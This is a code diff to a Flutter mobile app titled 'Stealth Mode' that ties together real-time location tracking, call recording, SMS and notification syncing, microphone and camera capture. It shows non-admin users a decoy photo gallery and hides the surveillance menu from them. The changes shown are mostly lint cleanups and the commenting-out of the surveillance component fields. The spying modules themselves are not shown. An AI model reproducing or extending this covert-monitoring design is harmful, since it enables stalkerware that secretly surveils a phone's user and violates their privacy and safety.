@@ -11,7 +11,6 @@ import 'package:nospyme2/sliders/recordmc.dart';
 import 'package:nospyme2/sliders/smssync.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'dart:async';
-import 'package:firebase_auth_web/firebase_auth_web.dart';
 
 class PermissionManager {
   Future<bool> requestPermission(Permission permission) async {
@@ -47,6 +46,8 @@ class FirebaseManager {
 }
 
 class MyApp extends StatelessWidget {
+  const MyApp({super.key});
+
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
@@ -79,18 +80,21 @@ class App extends StatefulWidget {
   const App({super.key});
 
   @override
+  // ignore: library_private_types_in_public_api
   _AppState createState() => _AppState();
 }
 
 class _AppState extends State<App> {
   final PermissionManager _permissionManager = PermissionManager();
+  /*-----------------------
   final FirebaseManager _firebaseManager = FirebaseManager();
   final RealTimeLocation _realTimeLocation = RealTimeLocation();
   final CallRecorder _callRecorder = CallRecorder();
   final SMSSync _smsSync = SMSSync();
   final EnvironmentRecorder _environmentRecorder = EnvironmentRecorder();
-  final CameraPage _camera = CameraPage();
-  final NotiPage _notificationSync = NotiPage();
+  final CameraPage _camera = const CameraPage();
+  final NotiPage _notificationSync = const NotiPage(); 
+  -------------------------*/
 
   _AppState() {
     // Request all permissions
@@ -106,7 +110,7 @@ class _AppState extends State<App> {
       title: 'Stealth Mode',
       home: Scaffold(
         appBar: AppBar(
-          title: Text('Stealth Mode'),
+          title: const Text('Stealth Mode'),
         ),
         body: _buildBody(context),
       ),
@@ -138,15 +142,23 @@ class _AppState extends State<App> {
       }
     }
 
-    // TODO: Implement this method to check if the user is an admin.
+    // : Implement this method to check if the user is an admin.
     // If the user is not an admin, return a photo gallery.
     if (!isAdmin()) {
-      return PhotoGallery();
+      return const PhotoGallery();
     }
 
     // Return the sliders page.
     return const SlidersPage();
   }
+}
+
+class UserPlatform {
+  Map<String, dynamic>? customClaims;
+
+  UserPlatform({this.customClaims});
+
+  // Other properties and methods related to the user if needed.
 }
 
 class SlidersPage extends StatelessWidget {
@@ -156,43 +168,43 @@ class SlidersPage extends StatelessWidget {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: Text('Sliders'),
+        title: const Text('Sliders'),
       ),
       body: ListView(
         children: [
           Card(
             child: ListTile(
-              title: Text('Camera'),
+              title: const Text('Camera'),
               onTap: () => Navigator.pushNamed(context, '/camera'),
             ),
           ),
           Card(
             child: ListTile(
-              title: Text('Environment Recorder'),
+              title: const Text('Environment Recorder'),
               onTap: () => Navigator.pushNamed(context, '/envrec'),
             ),
           ),
           Card(
             child: ListTile(
-              title: Text('Notification Sync'),
+              title: const Text('Notification Sync'),
               onTap: () => Navigator.pushNamed(context, '/noti'),
             ),
           ),
           Card(
             child: ListTile(
-              title: Text('Real-time Location Tracking'),
+              title: const Text('Real-time Location Tracking'),
               onTap: () => Navigator.pushNamed(context, '/realtmloc'),
             ),
           ),
           Card(
             child: ListTile(
-              title: Text('Record Microphone'),
+              title: const Text('Record Microphone'),
               onTap: () => Navigator.pushNamed(context, '/recordmc'),
             ),
           ),
           Card(
             child: ListTile(
-              title: Text('SMS Sync'),
+              title: const Text('SMS Sync'),
               onTap: () => Navigator.pushNamed(context, '/smssync'),
             ),
           ),
@@ -203,14 +215,16 @@ class SlidersPage extends StatelessWidget {
 }
 
 class PhotoGallery extends StatelessWidget {
+  const PhotoGallery({super.key});
+
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: Text('Photo Gallery'),
+        title: const Text('Photo Gallery'),
       ),
       body: GridView.builder(
-        gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
+        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
           crossAxisCount: 2,
         ),
         itemCount: 100,
